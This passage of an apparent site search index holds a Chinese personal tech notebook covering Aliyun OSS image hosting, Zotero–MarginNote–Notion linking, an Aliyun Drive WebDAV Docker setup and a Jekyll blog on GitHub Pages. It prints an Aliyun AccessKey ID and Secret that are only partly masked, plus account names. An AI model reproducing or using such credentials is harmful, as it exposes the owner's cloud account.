\u7684\u66ff\u4ee3\u54c1\u3002\u76f8\u6bd4\u4e4b\u4e0b\uff0c\u963f\u91cc\u4e91 OSS \u5728\u4ed8\u51fa\u5c11\u91cf\u91d1\u94b1\u7684\u524d\u63d0\u4e0b\u53ef\u4ee5\u63d0\u4f9b\u66f4\u597d\u7684\u670d\u52a1\uff0c\u4e14\u53ef\u4ee5\u4e0a\u4f20\u6587\u4ef6\u3002</p>"},{"location":"other/picgo-typora-oss/#21-oss","title":"2.1 \u963f\u91cc\u4e91 OSS","text":"<ul> <li>\u521b\u5efa bucket\uff1ahappytsing-figure-bed</li> <li>\u914d\u7f6e\u7528\u6237\u548c\u6743\u9650</li> </ul> <p>\u7136\u540e\u521b\u5efa\u65b0\u7528\u6237\uff0c\u7528\u6237\u767b\u5f55\u540d\u79f0 happytsing@17215**112358346.onaliyun.com\uff1a</p> <ul> <li>AccessKey ID\uff1aLTAI5t7S**yWJ9Yx7UR4VtYP</li> <li>AccessKey Secret\uff1aVTtibo**ESVGdtGacHC1q9dCT1G8BY</li> </ul> <p>\u8fdb\u5165\u7528\u6237\u7ba1\u7406\u9875\u9762\uff0c\u4e3a\u5176\u6dfb\u52a0 OSS \u6743\u9650\u3002</p> <p>\u81ea\u5b9a\u4e49\u57df\u540d</p> <p>\u76ee\u524d\u5df2\u7ecf\u53ef\u4ee5\u901a\u8fc7\u963f\u91cc\u4e91\u7684\u57df\u540d\u8bbf\u95ee\u56fe\u7247\uff0c\u5982\u679c\u60f3\u4f7f\u7528\u81ea\u5df1\u7684\u57df\u540d\u7684\u8bdd\uff0c\u9700\u8981\u8fdb\u5165\u4f20\u8f93\u7ba1\u7406\uff0c\u7ed1\u5b9a\u81ea\u5df1\u7684\u57df\u540d\uff0c\u4f46\u9700\u8981\u8be5\u57df\u540d\u5df2\u7ecf\u5907\u6848\u3002</p>"},{"location":"other/picgo-typora-oss/#22-picgo","title":"2.2 Picgo","text":"<p>\u6b64\u5904\u5c06\u6307\u5b9a\u5b58\u50a8\u8def\u5f84<code>img/</code>\u4fee\u6539\u4e3a\u5f53\u524d markdown \u7684\u82f1\u6587\u540d\uff0c\u6765\u5bf9\u56fe\u7247\u8fdb\u884c\u5206\u7c7b\uff0c\u5982 git \u7b14\u8bb0\u76f8\u5173\u5c31\u5c06\u56fe\u7247\u5b58\u653e\u5230<code>git/</code>\u76ee\u5f55\u4e0b\u3002</p>"},{"location":"other/picgo-typora-oss/#23-ossbrowser-upload-file","title":"2.3 ossbrowser upload file","text":"<p>\u521b\u5efa\u65b0\u7684 bucket\uff1ahappytsing-file-bed</p> <p>\u5b89\u88c5\u5e76\u767b\u5f55ossbrowser\uff0cAccessKey \u4fe1\u606f\u540c\u4e0a\u3002</p> <p>\u5728 ossbrowser \u4e2d\u53ef\u4ee5\u76f4\u63a5\u4e0a\u4f20\u6587\u4ef6\uff0c\u6b64\u5904\u4e0a\u4f20 pdf \u4e3b\u8981\u662f\u4e3a\u4e86\u540e\u7eed\u5728\u7b14\u8bb0\u4e2d\u76f4\u63a5\u8d34\u94fe\u63a5\u3002</p> <p>\u540c\u6837\u7684\uff0c\u4e3a\u5f53\u524d markdown \u6587\u4ef6\u5f15\u7528\u7684\u6587\u4ef6\u653e\u5728\u540c\u4e00\u4e2a\u6587\u4ef6\u5939\u4e0b\u3002</p>"},{"location":"other/picgo-typora-oss/#typora","title":"\u4e09\u3001Typora","text":"<p>\u4f7f\u7528 Typora \u53ef\u4ee5\u81ea\u52a8\u4e0a\u4f20\u56fe\u7247\uff0c\u7b80\u5355\u8bbe\u7f6e\u5982\u4e0b\uff1a</p> <p></p> <p>Congratulations and enjoy!</p>"},{"location":"other/zetero-marginnote3-notion/","title":"\u6587\u732e\u7ba1\u7406\uff1aZetero-Marginote3-Notion","text":""},{"location":"other/zetero-marginnote3-notion/#background","title":"BackGround","text":"<p>\u4f7f\u7528 Zotero \u8fdb\u884c\u6587\u732e\u7ba1\u7406\uff0cMarginNote3 \u9605\u8bfb\u8bba\u6587\uff0cNotion \u505a\u7b14\u8bb0\uff0c\u4f46\u662f\u4e09\u8005\u5404\u81ea\u72ec\u7acb\uff0c\u7ecf\u8fc7\u4e00\u756a\u63a2\u7d22\uff0c\u53d1\u73b0\u53ef\u4ee5\u4f7f\u7528 Zotero \u4f5c\u4e3a\u4e2d\u67a2\uff0c\u8fde\u63a5 MN3 \u548c Notion\uff0c\u5b9e\u73b0\u8de8\u5e73\u53f0\u7684\u5b8c\u7f8e\u8054\u52a8\u3002</p>"},{"location":"other/zetero-marginnote3-notion/#download-icons","title":"Download icons","text":"<ul> <li>notion.ico</li> <li>marginnote.ico</li> </ul> <p>Download the file to the directory\uff1a<code>~/Zotero/locate</code></p> <p></p>"},{"location":"other/zetero-marginnote3-notion/#configure-enginesjson","title":"Configure engines.json","text":"<pre><code>cd ~/Zotero/locate\nvim engines.json # You can also use\uff1aopen engines.json\n</code></pre> <p>Add as following</p> <pre><code>[\n  {\n    // Do not change the original configuration, simply add below it\n  },\n  {\n    \"_name\": \"Notion\",\n    \"_alias\": \"Notion\",\n    \"_description\": \"Notion\",\n    \"_icon\": \"file:///Users/happytsing/Zotero/locate/notion.ico\",\n    \"_hidden\": false,\n    \"_urlTemplate\": \"https://www.notion.so/{z:callNumber}\",\n    \"_urlParams\": [],\n    \"_urlNamespaces\": {\n      \"rft\": \"info:ofi/fmt:kev:mtx:journal\",\n      \"z\": \"http://www.zotero.org/namespaces/openSearch#\",\n      \"\": \"http://a9.com/-/spec/opensearch/1.1/\"\n    },\n    \"_iconSourceURI\": \"https://github.com/WlqFigureBed/FigureBed-one/raw/master/img/202111081503427.ico\"\n  },\n  {\n    \"_name\": \"MarginNote3\",\n    \"_alias\": \"MarginNote3\",\n    \"_description\": \"MarginNote3\",\n    \"_icon\": \"file:///Users/happytsing/Zotero/locate/marginnote.ico\",\n    \"_hidden\": false,\n    \"_urlTemplate\": \"marginnote3app://notebook/{z:extra}\",\n    \"_urlParams\": [],\n    \"_urlNamespaces\": {\n      \"rft\": \"info:ofi/fmt:kev:mtx:journal\",\n      \"z\": \"http://www.zotero.org/namespaces/openSearch#\",\n      \"\": \"http://a9.com/-/spec/opensearch/1.1/\"\n    },\n    \"_iconSourceURI\": \"https://github.com/WlqFigureBed/FigureBed-one/raw/master/img/202111081459879.ico\"\n  }\n]\n</code></pre> <p>Save <code>engines.json</code> and Restart Zotero\uff01</p>"},{"location":"other/zetero-marginnote3-notion/#get-keyword","title":"Get keyword","text":""},{"location":"other/zetero-marginnote3-notion/#notion","title":"Notion","text":"<ul> <li>Select the page you want to link to Zotero</li> <li>Copy link\uff1a<code>command + L</code></li> </ul>"},{"location":"other/zetero-marginnote3-notion/#marginnote3","title":"MarginNote3","text":"<ul> <li>Select the notebook you want to link to Zotero</li> <li>Copy link\uff1a<code>\u590d\u5236\u7b14\u8bb0\u672cURL</code></li> </ul>"},{"location":"other/zetero-marginnote3-notion/#link-to-zotero","title":"Link to Zotero","text":"<p>Now we have links to notion and mn3's notes.</p> <p>Notion link\uff1a</p> <pre><code>https://www.notion.so/Test-54c46d3e952c443f809e1c904f0e0787\n</code></pre> <p>MarginNote3 link\uff1a</p> <pre><code>marginnote3app://notebook/BAEFA408-7373-4D6C-8525-7489690CD1AE\n</code></pre> <p>Look again at the file <code>engines.json</code>\uff1a</p> <pre><code>\"_urlTemplate\": \"https://www.notion.so/{z:callNumber}\"\n\"_urlTemplate\": \"marginnote3app://notebook/{z:extra}\"\n</code></pre> <p>So we just need to change the <code>callNumber</code> and <code>extra</code>field in Zotero\uff1a</p> <p></p> <p>Click on the green arrow above info\uff1a</p> <p></p> <p>View our final results\uff1a</p> <p></p> <p>Congratulations and enjoy!</p>"},{"location":"other/zetero-marginnote3-notion/#config-zotero","title":"config zotero","text":"<p>update 2022.07.16</p> <p>plugins\uff1a</p> <ul> <li> <p>translators_CN\uff1a\u7528\u4e8e\u6293\u53bb\u4e2d\u6587\u5b66\u672f\u7f51\u7ad9\u7684\u63d2\u4ef6</p> </li> <li> <p>zotero-pdf-translate\uff1a\u5212\u8bcd\u7ffb\u8bd1</p> </li> </ul>"},{"location":"other/%E7%8E%A9%E8%BD%AC%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98/","title":"\u73a9\u8f6c\u963f\u91cc\u4e91\u76d8","text":""},{"location":"other/%E7%8E%A9%E8%BD%AC%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98/#descriptions","title":"Descriptions","text":"<p>\u963f\u91cc\u4e91\u76d8\u4e0d\u9650\u901f\uff0c\u4f46\u662f\u9ed8\u8ba4\u53ea\u80fd\u64ad\u653e 1080P\uff0c\u4e14\u4e0d\u652f\u6301 TV \u7aef\u3002</p>"},{"location":"other/%E7%8E%A9%E8%BD%AC%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98/#webdav","title":"webdav","text":"<p>\u5f00\u6e90\u9879\u76ee\uff1aaliyundrive-webdav</p> <p>\u57fa\u4e8e\u4e0a\u8ff0\u9879\u76ee\uff0c\u53ef\u4ee5\u9009\u62e9 docker \u5feb\u6377\u4f7f\u7528\uff1a</p> <pre><code>docker run -d --name=aliyundrive-webdav --restart=unless-stopped -p 8080:8080 \\\n  -v /etc/aliyundrive-webdav/:/etc/aliyundrive-webdav/ \\\n  -e REFRESH_TOKEN='your-refresh-token' \\\n  -e WEBDAV_AUTH_USER=admin \\\n  -e WEBDAV_AUTH_PASSWORD=admin \\\n  messense/aliyundrive-webdav\n</code></pre> <ul> <li>REFRESH_TOKEN\uff1a\u963f\u91cc\u4e91\u76d8 token\uff0c\u83b7\u53d6\u65b9\u6cd5\uff1a</li> <li>\u767b\u5f55\u963f\u91cc\u4e91\u76d8</li> <li>\u63a7\u5236\u53f0\u7c98\u8d34\uff1a<code>JSON.parse(localStorage.token).refresh_token</code></li> <li>WEBDAV_AUTH_USER\uff1a\u540e\u7eed\u767b\u5f55\u7684\u8d26\u53f7\uff0c\u9ed8\u8ba4\u5373\u53ef</li> <li>WEBDAV_AUTH_PASSWORD\uff1a\u540e\u7eed\u767b\u5f55\u7684\u5bc6\u7801\uff0c\u9ed8\u8ba4\u5373\u53ef</li> </ul> <p>docker \u8fd0\u884c\u4e4b\u540e\uff0c\u5728 <code>http://localhost:8080</code>\u8f93\u5165\u8bbe\u7f6e\u7684\u8d26\u53f7\u5bc6\u7801\u767b\u5f55\uff0c\u5373\u53ef\u770b\u5230\u963f\u91cc\u4e91\u76d8\u7684\u6587\u4ef6\u3002</p>"},{"location":"other/%E7%8E%A9%E8%BD%AC%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98/#usage","title":"usage","text":"<p>MAC \u7aef\u63a8\u8350\u4e24\u4e2a\u8f6f\u4ef6\uff1a</p> <ul> <li>IINA</li> <li>infuse</li> </ul> <p>\u642d\u914d webdav \u5373\u53ef\u5b9e\u73b0 4k \u64ad\u653e\u3002</p>"},{"location":"other/%E7%8E%A9%E8%BD%AC%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98/#iina","title":"IINA","text":"<p>\u590d\u5236\u60f3\u8981\u64ad\u653e\u7684\u94fe\u63a5\u5730\u5740\uff1a<code>http://localhost:8080/path/to/movie.name.mkv</code>\uff0c\u8fdb\u5165 IINA\uff0c\u505a\u4e0b\u56fe\u64cd\u4f5c\uff0c\u70b9\u51fb\u6253\u5f00\u5373\u53ef\u3002</p> <p></p>"},{"location":"other/%E7%8E%A9%E8%BD%AC%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98/#infuse","title":"infuse","text":"<p>\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u8def\u5f84\u8868\u793a\u663e\u793a\u54ea\u4e2a\u8def\u5f84\u7684\u5185\u5bb9\uff0c\u8f93\u5165<code>/</code>\u8868\u793a\u6839\u76ee\u5f55\u3002</p> <p></p>"},{"location":"other/%E7%8E%A9%E8%BD%AC%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98/#tv","title":"TV","text":"<p>\u5f00\u6e90\u9879\u76ee\uff1a</p> <ul> <li>\u963f\u91cc\u4e91\u76d8 TV</li> <li>KODI</li> </ul> <p>\u767b\u5f55\u540e\u5373\u53ef\u64ad\u653e\u963f\u91cc\u4e91\u76d8\u4e2d\u7684 4K \u89c6\u9891\uff01</p> <p>Note</p> <p>\u6b64\u5904\u4e5f\u53ef\u4f7f\u7528webdav\uff0c\u4f46\u4f7f\u7528\u963f\u91cc\u4e91\u76d8TV\u611f\u89c9\u66f4\u65b9\u4fbf\u3002</p>"},{"location":"other/blog/Github%20Page%20%2B%20Jekyll/","title":"Blog = Github Page + Jekyll","text":""},{"location":"other/blog/Github%20Page%20%2B%20Jekyll/#install-jekyll","title":"Install Jekyll","text":"<p>Windows10 \u4e0a\u5b89\u88c5 WSL2 Debian\uff0c\u5b89\u88c5 Jekyll\uff1aJekyll Docs</p> <pre><code># \u4f9d\u8d56\u51c6\u5907\uff0c\u6ce8\u610f\u4e00\u5b9a\u8981\u5b89\u88c5ruby-dev\uff01\nsudo apt install ruby ruby-dev rubygems nodejs\n# \u5b89\u88c5\nsudo gem install jekyll\n# \u67e5\u770b\u662f\u5426\u6210\u529f\njekyll --version\n# \u67e5\u770b\u662f\u5426\u662f\u6700\u65b0\u7248\u672c\ngem list jekyll\n</code></pre> <p>MacOS</p> <pre><code># \u4f9d\u8d56\u51c6\u5907\nbrew install chruby ruby-install\nruby-install ruby\necho \"source $(brew --prefix)/opt/chruby/share/chruby/chruby.sh\" &gt;&gt; ~/.zshrc\necho \"source $(brew --prefix)/opt/chruby/share/chruby/auto.sh\" &gt;&gt; ~/.zshrc\necho \"chruby ruby-3.1.2\" &gt;&gt; ~/.zshrc # run 'chruby' to see actual version\n# version should newer or 3.1.2\nruby -v\nsudo gem install jekyll\n</code></pre>"},{"location":"other/blog/Github%20Page%20%2B%20Jekyll/#install-and-run-huxpro","title":"Install and Run huxpro","text":"<p>huxpro \u662f Jekyll \u7684\u4e00\u6b3e\u4e3b\u9898\uff0c\u6211\u4eec\u65e0\u9700\u81ea\u5df1\u91cd\u65b0\u914d\u7f6e\uff0c\u76f4\u63a5\u62ff\u73b0\u6210\u7684\u5c31\u884c\uff0c\u8fd9\u4e2a\u4e3b\u9898\u975e\u5e38\u68d2\uff1ahuxpro</p> <pre><code># \u5b89\u88c5bundler\uff08\u4e00\u79cd\u5305\u7ba1\u7406\u5668\uff09\ngem install bundler\n# Installed dependencies in the Gemfile\nbundle install\n# \u53ef\u80fd\u9700\u8981\u8fd9\u4e2a\u4f9d\u8d56\uff1asudo apt install zlib1g-dev\n# \u672c\u5730\u8fd0\u884c\nbundle exec jekyll serve --trace\n# \u65e0\u6cd5\u542f\u52a8\u65f6\u5b89\u88c5\u8be5\u4f9d\u8d56\nbundle add webrick\n</code></pre> <p>bundler\uff1aRuby \u5f00\u53d1\u7684\u5305\u7ba1\u7406\uff0c\u53ea\u9700\u8981\u4e00\u4e2a bundler install \u547d\u4ee4\uff0c\u5c31\u53ef\u4ee5\u4e0b\u8f7d Gemfile \u6587\u4ef6\u91cc\u7684\u6240\u6709\u4f9d\u8d56\uff0c\u7531\u4e8e\u9700\u8981\u5b89\u88c5 Jekyll \u7684\u4e3b\u9898\uff0c\u4e3b\u9898\u7528\u5230\u4e86\u4e00\u4e9b\u4f9d\u8d56\u9700\u8981\u7528 bundler \u5b89\u88c5\uff01</p> <p>\u542f\u52a8\u540e\u9ed8\u8ba4\u8bbf\u95ee\u5730\u5740\uff1ahttp://127.0.0.1:4000/</p>"},{"location":"other/blog/Github%20Page%20%2B%20Jekyll/#huxpro-config","title":"huxpro config","text":""},{"location":"other/blog/Github%20Page%20%2B%20Jekyll/#_configyml","title":"_config.yml","text":"<p>\u4f60\u53ef\u4ee5\u901a\u7528\u4fee\u6539 <code>_config.yml</code>\u6587\u4ef6\u6765\u8f7b\u677e\u7684\u5f00\u59cb\u642d\u5efa\u81ea\u5df1\u7684\u535a\u5ba2:</p>"},{"location":"other/blog/Github%20Page%20%2B%20Jekyll/#sitesnsbuild-settings","title":"Site\u3001SNS\u3001Build settings","text":"<pre><code># Site settings\nurl: \"https://leqing.online/\"\n\n# SNS settings\ngithub_username: happytsing # \u4f60\u7684github\u8d26\u53f7\ntwitter_username: leqing666 # \u4f60\u7684\u5fae\u535a\u8d26\u53f7\uff0c\u5e95\u90e8\u94fe\u63a5\u4f1a\u81ea\u52a8\u66f4\u65b0\u7684\u3002\n---\n# Build settings\npaginate: 10 # \u4e00\u9875\u4f60\u51c6\u5907\u653e\u51e0\u7bc7\u6587\u7ae0\n</code></pre> <p>Jekyll \u5b98\u65b9\u7f51\u7ad9\u8fd8\u6709\u5f88\u591a\u7684\u53c2\u6570\u53ef\u4ee5\u8c03\uff0c\u6bd4\u5982\u8bbe\u7f6e\u6587\u7ae0\u7684\u94fe\u63a5\u5f62\u5f0f...\u7f51\u5740\uff1a</p> <ul> <li>Jekyll - EN</li> <li>Jekyll - CN</li> </ul>"},{"location":"other/blog/Github%20Page%20%2B%20Jekyll/#disqus-settings","title":"Disqus settings","text":"<p>\u535a\u5ba2\u4f7f\u7528Disqus\u8bc4\u8bba\u7cfb\u7edf\uff1a</p> <ul> <li> <p>\u6ce8\u518c\u5e10\u53f7</p> </li> <li> <p>\u83b7\u53d6 Shortname\uff1aleqing-work</p> </li> </ul> <p></p> <ul> <li>\u914d\u7f6e_config.yml</li> </ul> <pre><code># Disqus settings\ndisqus_username: leqing-work\n</code></pre>"},{"location":"other/blog/Github%20Page%20%2B%20Jekyll/#analytics-settings","title":"Analytics settings","text":"<p>\u7f51\u7ad9\u5206\u6790\uff0c\u73b0\u5728\u652f\u6301\u767e\u5ea6\u7edf\u8ba1\u548c Google Analytics\u3002\u9700\u8981\u53bb\u5b98\u65b9\u7f51\u7ad9\u6ce8\u518c\u4e00\u4e0b\uff0c\u7136\u540e\u5c06\u8fd4\u56de\u7684 code \u8d34\u5728\u4e0b\u9762\uff1a</p> <pre><code># Baidu Analytics\nba_track_id: 0ef6a02a593e0bcddc16f48386c9d8a5\n\n# Google Analytics\nga_track_id: \"UA-49627206-1\" # \u4f60\u7528Google\u8d26\u53f7\u53bb\u6ce8\u518c\u4e00\u4e2a\u5c31\u4f1a\u7ed9\u4f60\u4e00\u4e2a\u8fd9\u6837\u7684id\nga_domain: leqing.online # \u9ed8\u8ba4\u7684\u662f auto, \u8fd9\u91cc\u6211\u662f\u81ea\u5b9a\u4e49\u4e86\u7684\u57df\u540d\uff0c\u4f60\u5982\u679c\u6ca1\u6709\u81ea\u5df1\u7684\u57df\u540d\uff0c\u9700\u8981\u6539\u6210auto\u3002\n</code></pre>"},{"location":"other/blog/Github%20Page%20%2B%20Jekyll/#friends","title":"Friends","text":"<p>\u597d\u53cb\u94fe\u63a5\u90e8\u5206\u3002\u8fd9\u4f1a\u5728\u5168\u90e8\u9875\u9762\u663e\u793a\u3002</p> <p>\u8bbe\u7f6e\u662f\u5728 <code>_config.yml</code>\u6587\u4ef6\u91cc\u9762\u7684<code>Friends</code>\u90a3\u5757\uff0c\u81ea\u5df1\u52a0\u5427\u3002</p> <pre><code># Friends\nfriends:\n  [\n    { title: \"Foo Blog\", href: \"http://foo.github.io/\" },\n    { title: \"Bar Blog\", href: \"http://bar.github.io\" },\n  ]\n</code></pre>"},{"location":"other/blog/Github%20Page%20%2B%20Jekyll/#post-articles","title":"Post Articles","text":"<p>\u8981\u53d1\u8868\u7684\u6587\u7ae0\u4e00\u822c\u4ee5 markdown \u7684\u683c\u5f0f\u653e\u5728\u8fd9\u91cc<code>_posts/</code>\uff0c\u4f60\u53ea\u8981\u770b\u770b\u8fd9\u7bc7\u6a21\u677f\u91cc\u7684\u6587\u7ae0\u4f60\u5c31\u7acb\u523b\u660e\u767d\u8be5\u5982\u4f55\u8bbe\u7f6e\u3002</p> <p>\u6587\u7ae0\u6700\u524d\u9762\u6709\u5982\u4e0b\u7684\u683c\u5f0f\u8bbe\u5b9a\uff1a</p> <pre><code>---\nlayout: post\ntitle: \"\u4e2d\u56fd\u9ad8\u7b49\u6559\u80b2\u7684\u7cfb\u7edf\u6027\u5931\u8d25\"\nsubtitle: \"The Systematic Failure of Higher Education in China\"\ndate: 2021-01-19 12:00:00\nauthor: \"HapppyTsing\"\ncatalog: false\nheader-style: text\n# header-img: \"img/post-bg-2015.jpg\"\ntags:\n  - Life\n  - JAVA\n---\n</code></pre> <p>\u5728\u5f15\u5165Rake\u5de5\u5177\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u81ea\u52a8\u751f\u6210\u4e0a\u9762\u7684\u6587\u7ae0\u6a21\u677f\uff1a</p> <pre><code>rake post title=\"\u4e2d\u56fd\u9ad8\u7b49\u6559\u80b2\u7684\u7cfb\u7edf\u6027\u5931\u8d25\" subtitle=\"The Systematic Failure of Higher Education in China\"\n</code></pre> <p>rake \u5de5\u5177\u751f\u6210\u6587\u4ef6\u7684\u903b\u8f91\u5728\u4e8e Rakefile\uff1a</p> <pre><code># WlqFigureBed.github.io/Rakefile\npost.puts \"header-img: \\\"img/post-bg-2015.jpg\\\"\"\npost.puts \"header-style: text\"\n</code></pre> <p>\u7b2c\u4e00\u53e5\u8bed\u53e5\u751f\u6210\u7684 markdown\uff0c\u5728\u4e0a\u4f20\u540e\u4f1a\u6709\u56fe\u7247\uff1a</p> <p></p> <p>\u7b2c\u4e8c\u53e5\u8bed\u53e5\u751f\u6210\u7684 markdown\uff0c\u5219\u4e0d\u4f1a\uff1a</p> <p></p>"},{"location":"other/blog/Github%20Page%20%2B%20Jekyll/#github-page","title":"Github Page","text":"<p>\u8be6\u60c5\u53ef\u4ee5\u67e5\u770bGithub Page Docs\u3002</p>"},{"location":"other/blog/Github%20Page%20%2B%20Jekyll/#create-repository","title":"Create Repository","text":"<p>Steps\uff1a</p> <ul> <li>\u7528\u4e8e\u4f5c\u4e3a Github Page \u7684\u4ed3\u5e93\u540d\u5b57\u5fc5\u987b\u4e3a\uff1a<code>username.github.io</code></li> <li>\u9009\u62e9 Public \u7684\u4ed3\u5e93\uff0c\u521b\u5efa\u6210\u529f\u540e<code>git clone</code>\u4e0b\u9879\u76ee\uff01</li> <li>\u4e3b\u9875\u4e3a\u6839\u76ee\u5f55\u4e2d\u540d\u4e3a index.md \u7684\u6587\u4ef6\uff0c\u521b\u5efa\uff1a<code>vim index.md</code>\uff0c\u8f93\u5165 hello world\uff01</li> <li><code>git push</code>\uff0c\u767b\u5f55\uff1a<code>hppts://username.github.io</code>\uff0c\u5df2\u7ecf\u53ef\u4ee5\u770b\u5230\u7f51\u7ad9</li> </ul> <p>Two Question\uff1a</p> <ul> <li>\u5982\u4f55\u7ed1\u5b9a\u81ea\u5df1\u7684\u57df\u540d\uff1f</li> <li>\u592a\u4e11\uff0c\u5982\u4f55\u4f18\u5316\uff1f\uff1aJekyll</li> </ul>"},{"location":"other/blog/Github%20Page%20%2B%20Jekyll/#142-bind-domain","title":"1.4.2 Bind Domain","text":"<p>\u8bb0\u5f97\u5b8c\u6210\uff1a\u7533\u8bf7\u57df\u540d -&gt; \u57df\u540d\u5907\u6848 -&gt; \u516c\u5b89\u5907\u6848</p> <p>\u6559\u7a0b\u8be6\u60c5\u53c2\u89c1\uff1a</p> <ul> <li>\u77e5\u4e4e github \u600e\u4e48\u7ed1\u5b9a\u81ea\u5df1\u7684\u57df\u540d\uff1f</li> <li>Github Docs Domain For Your Site</li> </ul> <p>\u5728\u963f\u91cc\u4e91 DNS\u8bbe\u7f6e DNS \u4fe1\u606f\uff0c\u5982\u4e0b\uff1a</p> <p></p> <p>\u5728 <code>WlqFigureBed.github.io/CNAME</code>\u4e2d\u8f93\u5165\u5982\u4e0b\u5185\u5bb9\uff1a</p> <pre><code>leqing.online\n</code></pre> <p>\u6b64\u540e Github Page \u4f1a\u81ea\u52a8\u8bc6\u522b\uff0cGithub Page \u00d7 Jekyll \u8fd9\u7ae0\u7684\u56fe\u4e2d\u53ef\u4ee5\u770b\u5230<code>Custom domain</code>\u4f1a\u81ea\u52a8\u8bc6\u522b\u4e3a<code>leqing.online</code>\u3002</p> <p>Note\uff1achange</p> <ul> <li>wlqfiguredbed.github.io -&gt; happytsing.github.io</li> </ul>"},{"location":"other/blog/Github%20Page%20%2B%20Jekyll/#143-github-page-jekyll","title":"1.4.3 Github Page \u00d7 Jekyll","text":"<p>\u5c06\u521a\u624d\u7684 Jekyll \u4e3b\u9898\u7684\u6240\u6709\u6587\u4ef6\u590d\u5236\uff0c\u7c98\u8d34\u5230 Github Page \u7684\u4ed3\u5e93\u4e2d\u5373\u53ef\uff01</p> <p>\u914d\u7f6e_config.yml\uff1a</p> <pre><code>url: \"https://leqing.online\" # your host, for absolute URL\nbaseurl: \"\" # for example, '/blog' if your blog hosted on 'host/blog'\n</code></pre> <p>\u914d\u7f6e Github Page\uff1aSettings -&gt; Pages</p> <p></p>"},{"location":"other/blog/Github%20Page%20%2B%20Jekyll/#article-location","title":"Article Location","text":"<p>\u6587\u7ae0\u4e3b\u8981\u5b58\u50a8\u5728\u4e09\u4e2a\u5730\u65b9\uff1a</p> <ul> <li>_posts</li> <li> <p>_includes/about</p> </li> <li> <p>_includes/posts</p> </li> </ul> <p>_posts</p> <p>\u5b58\u653e\u771f\u6b63\u53d1\u5e03\u7684\u5185\u5bb9\uff01</p> <p>\u5176\u4e2d\u7684\u6587\u7ae0\u5f00\u5934\u6709\u4e00\u4e9b\u7279\u6b8a\u8bbe\u7f6e\uff0c\u8be6\u89c1Post Articles</p> <p>_includes/about</p> <p>\u5b58\u653e\u4e24\u4e2a\u6587\u4ef6\uff1a</p> <ul> <li>en.md</li> <li>zh.md</li> </ul> <p>\u662f about \u9875\u9762\u7684\u4e2a\u4eba\u4ecb\u7ecd\u4fe1\u606f</p> <p>_includes/posts</p> <p>\u5b58\u653e\u4e00\u7cfb\u5217\u6587\u4ef6\u5939\uff0c\u5176\u4e2d\u6bcf\u4e2a\u6587\u4ef6\u5939\u4e0b\u5b58\u653e\u4e24\u4e2a\u6587\u4ef6\uff1a</p> <ul> <li>en.md</li> <li>zh.md</li> </ul> <pre><code>-- posts\n    -- 2017-07-12-upgrading-eleme-to-pwa\n        -- en.md\n        -- zh.md\n</code></pre> <p>\u6b64\u65f6\u518d\u67e5\u770b_posts \u6587\u4ef6\u5939\u4e0b\u7684\u6587\u4ef6\uff0c\u627e\u5230\uff1a<code>2017-07-12-upgrading-eleme-to-pwa.md</code></p> <p>\u5176\u4e2d\u7684\u5b8c\u6574\u7684\u6587\u4ef6\u5185\u5bb9\u67e5\u770b\uff1aAvailable Both English And Chinese Versions\u3002</p>"},{"location":"other/blog/Github%20Page%20%2B%20Jekyll/#picture-location","title":"Picture Location","text":"<p>img/archive-bg\uff1aarchive.html</p> <p>img/about-bg\uff1aabout.html</p> <p>img/404-bg\uff1a</p> <ul> <li>404.html</li> <li>offline.html</li> </ul> <p>img/home-bg\uff1a_config.yml</p> <p>img/avatar\uff1a_config.yml</p> <p>img/webicon\uff1a</p> <ul> <li> <p>_includes/head.html</p> </li> <li> <p>_layouts \u4e0b\u7684\u6240\u6709\u6587\u4ef6\u90fd\u6709\u5f15\u7528<code>/img/icon_wechat.png</code>\u8fd9\u4e2a\u6587\u4ef6\uff0c\u4f46\u662f\u53ea\u6709\u5176\u4e2d\u7684 default.html \u6ca1\u6709\u5c06\u5176\u6ce8\u91ca\u6389\uff01\u6211\u5c06\u5176\u6539\u6210\u4e86\u5f15\u7528<code>img/webicon/2.png</code>\uff0c\u8fd9\u4e2a\u6682\u65f6\u4e0d\u77e5\u9053\u6709\u4ec0\u4e48\u7528\uff01</p> </li> </ul>"},{"location":"other/blog/Github%20Page%20%2B%20Jekyll/#available-both-english-and-chinese-versions","title":"Available Both English And Chinese Versions","text":"<ul> <li>xxx.github.io/_posts/2017-07-12-upgrading-eleme-to-pwa.md</li> </ul> <ul> <li>xxx.github.io/_includes/posts/2017-07-12-upgrading-eleme-to-pwa</li> </ul> <p>\u6ce8\u610f\uff1aen.md \u548c zh.md \u4e24\u4e2a\u90fd\u662f\u5355\u7eaf\u7684 markdown \u6587\u4ef6\uff0c\u4e14\u4e0d\u9700\u8981\uff1a</p> <pre><code>---\nlayout:       post\ntitle:        \"\u997f\u4e86\u4e48\u7684 PWA \u5347\u7ea7\u5b9e\u8df5\"\nsubtitle:     \"Upgrading Ele.me to Progressive Web App\"\n...\n---\n</code></pre> <p>\u8bf8\u5982\u4ee5\u4e0a\u7684\u5185\u5bb9\u662f\u4e0d\u9700\u8981\u7684\uff01\u76f4\u63a5\u8f93\u5165\u5185\u5bb9\u5373\u53ef\uff01</p> <ul> <li>Final Effects</li> </ul> <p></p>"},{"location":"other/blog/Github%20Page%20%2B%20Jekyll/#reference","title":"Reference","text":"<ul> <li>Github Hux Blog</li> <li>Jekyll Docs</li> <li>Github Page Docs</li> </ul>"},{"location":"other/blog/Github%20Page%20%2B%20Mkdocs/","title":"Blog = Github Page + Mkdocs","text":""},{"location":"other/blog/Github%20Page%20%2B%20Mkdocs/#_1","title":"\u6846\u67b6\u9009\u62e9","text":"<p>\u76ee\u524d\u53ef\u4ee5\u6e32\u67d3 Markdown \u7684\u6846\u67b6\u5f88\u591a\uff1a</p> <ul> <li>GitBook</li> <li>Docsify</li> <li>VuePress</li> <li>Jekyll</li> <li>MkDocs</li> </ul> <p>\u6b64\u524d\u7b14\u8005\u66fe\u4f7f\u7528 Jekyll 